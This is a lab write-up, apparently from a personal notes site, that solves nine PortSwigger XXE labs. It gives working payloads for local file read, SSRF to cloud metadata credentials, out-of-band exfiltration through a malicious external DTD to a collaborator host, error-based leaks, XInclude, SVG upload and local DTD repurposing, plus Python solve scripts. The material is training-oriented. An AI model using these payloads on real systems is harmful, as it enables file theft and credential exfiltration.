# XXE

### Lab 1: XXE for Arbitrary File Read <a href="#lab-1-xxe-for-arbitrary-file-read" id="lab-1-xxe-for-arbitrary-file-read"></a>

This lab is solved by reading `/etc/passwd`, and it uses a 'Check stock' function that parses XML input:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-994885f9bc7346b32adf43907637fc967c7c41c5%252Fportswigger-xxe-writeup-image.png%3Falt%3Dmedia%26token%3Dd5be61c8-efb4-4ccd-981a-a1eea4f1be3c&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=26e9570c&#x26;sv=2" alt=""><figcaption></figcaption></figure>

This is an apprentice lab, so this can be solved using a basic payload.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<stockCheck>
<productId>&test;</productId>
<storeId>1</storeId>
</stockCheck>
```

Here's the script:

```python
import requests
import re
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HOST = '0a61005103bb056880e0f82900800075'
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url = f'https://{HOST}.web-security-academy.net'
cookies = {
        'session':'CyubLLWyK9XPlBRj6SewtH3DwNPR9Oeb'
}

headers = {
        'Content-Type':'application/xml'
}
s = requests.Session()

xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<stockCheck>
<productId>&test;</productId>
<storeId>1</storeId>
</stockCheck>
"""

r = s.post(url + '/product/stock',data=xml, proxies=proxies, verify=False, cookies=cookies, headers=headers)
print(r.text)
```

### Lab 2: XXE for SSRF <a href="#lab-2-xxe-for-ssrf" id="lab-2-xxe-for-ssrf"></a>

To solve lab, access `http://169.254.169.254/` and read some sensitive information from there.

When I used the same payload as above (with the `file:///etc/passwd` replaced with the HTTP URL), I get this:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-3361c0e833c9ac9dbb88c3fea97078dfc07d0a99%252Fportswigger-xxe-writeup-image-1.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=f338409e&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Appending `/latest` results in a different response:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-928ac568ab0597d6a860ee83f6973256bb66226b%252Fportswigger-xxe-writeup-image-2.png%3Falt%3Dmedia%26token%3D95a74348-1db2-440c-a0c9-1f4280e4a838&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=d260a547&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Setting the URL to `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin` solves the lab.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY test SYSTEM 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin'>]>
<stockCheck>
<productId>&test;</productId>
<storeId>1</storeId>
</stockCheck>
```

### Lab 3: Out of Band Interaction <a href="#lab-3-out-of-band-interaction" id="lab-3-out-of-band-interaction"></a>

This lab requires us send a HTTP request to a Burp Collaborator link. This is a blind XXE example.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY test SYSTEM 'http://BURP.oastify.com'>]>
<stockCheck>
<productId>&test;</productId>
<storeId>1</storeId>
</stockCheck>
```

### Lab 4: Out of Band via XML parameter entities <a href="#lab-4-out-of-band-via-xml-parameter-entities" id="lab-4-out-of-band-via-xml-parameter-entities"></a>

This lab blocks regular external entities. Trying to use `ENTITY` results in a block:

```bash
$ python3 lab.py
"Entities are not allowed for security reasons"
```

Regular external entities are custom XML entities whose defined values are loaded from outside of the DTD they are declared in. This means that for this lab, I cannot define my own entities.

As such, I can use the `stockCheck` entity, which is given to me. Next, I need to figure out how NOT to use custom regular external entities. PayloadAllTheThings uses this:

```xml
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///abcxyz/">

    %local_dtd;
]
```

Using a `%` changes it to a parameter entity, which can only be referenced elsewhere within the DTD (hence using `stockCheck`).

Thus, the payload is as such:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY % test SYSTEM 'http://vpoo93ane26oxeihvm42tgknbeh55vtk.oastify.com'> %test; ]> 
<stockCheck>
<productId>1</productId>
<storeId>1</storeId>
</stockCheck>
```

### Lab 5: Blind XXE using malicious external DTD <a href="#lab-5-blind-xxe-using-malicious-external-dtd" id="lab-5-blind-xxe-using-malicious-external-dtd"></a>

To solve this lab, read `/etc/hostname`. This lab gives me an Exploit Server, as well as a Submit Feedback function.

The submit feedback function wasn't particularly interesting.

I was unable to read files using the method used in Lab 4. However, I was able to make the lab send a request to Burp Collaborator. Since I was given an Exploit Server, I can try to store a malicious DTD on it.

I want to extract the data from `/etc/hostname`, and then send that to Collaborator. I stored this file on the exploit server:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP/?x=%file;'>">
%eval;
%exfil;
```

`&#x25` represents a `%` in Unicode, and it is used to prevent syntax errors. After storing this on the exploit server, I used this payload to make the application retrieve it and process it.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % test SYSTEM 'https://EXPLOIT/evil.dtd'> %test; ]> 
<stockCheck>
<productId>1</productId>
<storeId>1</storeId>
</stockCheck>
```

This would trigger a lookup to Collaborator:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-543aa8ad304f308708d625372632ce093221940a%252Fportswigger-xxe-writeup-image-3.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=be44a249&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Submitting that value solves the lab.

### Lab 6: Error based blind XXE <a href="#lab-6-error-based-blind-xxe" id="lab-6-error-based-blind-xxe"></a>

To solve this lab, use an external DTD to trigger an error message that displays `/etc/passwd`.

The error can be triggered by trying to read a file that does not exist.

```hxml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; fail SYSTEM 'file:///idontexist/%file;'>">
%eval;
%fail;
```

This would append the contents of the file behind the error message.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-0f1c33eb977ecd7ed1ca10b0bb6e10d30c6f1fdb%252Fportswigger-xxe-writeup-image-4.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=9dad4c34&#x26;sv=2" alt=""><figcaption></figcaption></figure>

### Lab 7: Exploiting XInclude <a href="#lab-7-exploiting-xinclude" id="lab-7-exploiting-xinclude"></a>

This time, the page no longer uses client-side XML to process it:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-8d8acf1e1a3bc01a1b14ce47d534ccfa04b297ce%252Fportswigger-xxe-writeup-image-5.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=eee0cc5c&#x26;sv=2" alt=""><figcaption></figcaption></figure>

As such, `XInclude` has to be used to exploit this. `XInclude` is part of the XML specification that allows XML docs to be built from sub-documents. All I have to do is reference the `XInclude` namespace.

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

Set the above as the `productId` parameter to solve the lab.

### Lab 8: XXE via Image File Upload <a href="#lab-8-xxe-via-image-file-upload" id="lab-8-xxe-via-image-file-upload"></a>

This lab uses the Apache Batik library to process image files. Read `/etc/hostname` to solve lab. The hint is the the SVG image format uses XML.

Here's the payload from PayloadAllTheThings:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Using the above payload, save it as a `.svg` file, and then upload it.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-9dc807d1f4efa81ec18533429ae4622625533f75%252Fportswigger-xxe-writeup-image-6.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=c226676f&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Upon viewing the image, I can see the result:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-edeca3975146e90b04a49c16eb90f0e21bf39c6a%252Fportswigger-xxe-writeup-image-7.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=5e07413&#x26;sv=2" alt=""><figcaption></figcaption></figure>

As usual, here's the script for uploading the image and solving the lab:

```python
import requests
import re
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HOST = '0a99005b040cf58d8003f33300ac00be'
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url = f'https://{HOST}.web-security-academy.net'
s = requests.Session()

r = s.get(url + '/post?postId=5', proxies=proxies, verify=False)
match = re.search(r'name="csrf" value="([0-9a-zA-z]+)', r.text)
csrf_token = match[1]

file = {
    'avatar':('evil.svg', open('exp.svg', 'r'), 'image/svg+xml')
}

form_data = {
    'csrf':csrf_token,
    'postId':'5',
    'comment':'test',
    'name':'test',
    'email':'test@test.com',
    'website':'http://test.com'
}

r = s.post(url + '/post/comment',data=form_data, proxies=proxies, verify=False, files=file)
if 'Your comment has been submitted' not in r.text:
    print('[-] Upload failed')
    sys.exit(1)

print('[+] Upload worked')
r = s.get(url + '/post?postId=5', proxies=proxies, verify=False)
match = re.findall(r'/post/comment/avatars\?filename=(\d.png)', r.text)
if match:
    for i in match:
        print(f'[+] Visit https://{HOST}.web-security-academy.net/post/comment/avatars?filename={i} to get answer')
```

### Lab 9: Repurposing Local DTD <a href="#lab-9-repurposing-local-dtd" id="lab-9-repurposing-local-dtd"></a>

This lab requires us to use the `/usr/share/yelp/dtd/docbookx.dtd` to exploit it, and within that particular DTD is an entity called `ISOamso`.

To solve the lab, firstly, we have to reference the local DTD, and I used a parameter entity:

```xml
<!DOCTYPE exploit [
<!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
]>
```

Next, I have to redefine the `ISOamso` entity, and I took the payload from PayloadAllTheThings:

```hxml
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;'>
```

So the final payload is:

```xml
<!DOCTYPE exploit [
<!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;'>
%local;
>]
```
